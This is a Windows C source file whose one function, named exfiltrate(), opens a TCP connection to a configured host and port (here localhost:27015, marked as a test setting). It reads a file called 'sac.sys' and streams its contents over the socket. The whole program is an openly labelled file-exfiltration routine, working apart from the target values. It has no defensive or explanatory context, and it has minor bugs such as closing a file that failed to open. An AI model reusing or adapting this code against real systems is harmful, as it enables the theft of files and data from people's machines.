#define __STDC_WANT_LIB_EXT1__ 1

#include <direct.h>
#include <io.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define HOST_NAME "localhost"
#define PORT_NUMBER "27015" // for testing purpose, usually have service listening
#define FILE_NAME "sac.sys"
#define BUFFER_SIZE 512

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")

void exfiltrate()
{
	//----------------------------------------------
	// declare variables

	WSADATA wsaData;
	struct addrinfo hints, *res;
	int stat, sockfd;
	FILE *fd;
	errno_t error;

	//buffer to read
	char buffer[BUFFER_SIZE];

	//----------------------------------------------
	// initialization

	// Init winsock
	stat = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (stat != NO_ERROR)
	{
		printf("WSAStartup failure: %d (No usable Winsock DLL)\n", stat);
		scanf_s(" ");
		// do alt action or exit
		exit(-1);
	}

	// Setup the hints address info structure
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET; // IPv4
	hints.ai_socktype = SOCK_STREAM; // TCP-based
	hints.ai_protocol = IPPROTO_TCP; // TCP protocol

	// Protocol-independent translation from an ANSI host name to IP address
	stat = 0;
	if ((stat = getaddrinfo(HOST_NAME, PORT_NUMBER, &hints, &res)) != 0)
	{
		printf("getaddrinfo failed: %s\n", gai_strerror(stat));
		// do alt action or exit
		WSACleanup();
		scanf_s(" ");
		exit(-1);
	}

	// Establish socket
	sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	if (sockfd == INVALID_SOCKET)
		printf("Failed to init socket : %d\n", WSAGetLastError());

	if (connect(sockfd, res->ai_addr, res->ai_addrlen) == SOCKET_ERROR)
	{
		printf("connection failed : %ld\n", WSAGetLastError());
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		exit(-1);
	}

	//----------------------------------------------
	// unit test: send file
	error = fopen_s(&fd, FILE_NAME, "r+");
	int bytes_read;
	if (error != 0)
	{
		printf("error opening file under ");

		// Get the current working directory:
		char* buf;
		if ((buf = _getcwd(NULL, 0)) != NULL)
		{
			printf("%s \n", buf);
			free(buf);
		}
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		fclose(fd);
		exit(-1);
	}
	else
	{
		while (!feof(fd))
		{
			if ((bytes_read = fread(&buffer, 1, BUFFER_SIZE, fd)) > 0)
				send(sockfd, buffer, bytes_read, 0);
			else
				break;
		}
	}

	stat = fclose(fd);
	if (stat != 0)
	{
		printf("error closing file");
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		exit(-1);
	}

	/*
	//----------------------------------------------
	// unit test: send text
	printf("Text: ");
	memset(buffer, sizeof(buffer), 512);
	fgets(buffer, 511, stdin);
	if (_write(sockfd, buffer, strlen(buffer)) < 0)
		printf("write socket failure");

	//----------------------------------------------
	// unit test: read text
	memset(buffer, 0, 512);
	if (_read(sockfd, buffer, 511) < 0)
		printf("read socket failure");
	printf("%s\n", buffer);
	*/

	//----------------------------------------------
	// close up

	if (closesocket(sockfd) == SOCKET_ERROR)
	{
		printf("Socket cannot be closed : %d\n", WSAGetLastError());
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		exit(-1);
	}
	freeaddrinfo(res);
	WSACleanup();
}

int main(int argc, char *argv[])
{
	exfiltrate();
	return 0;
}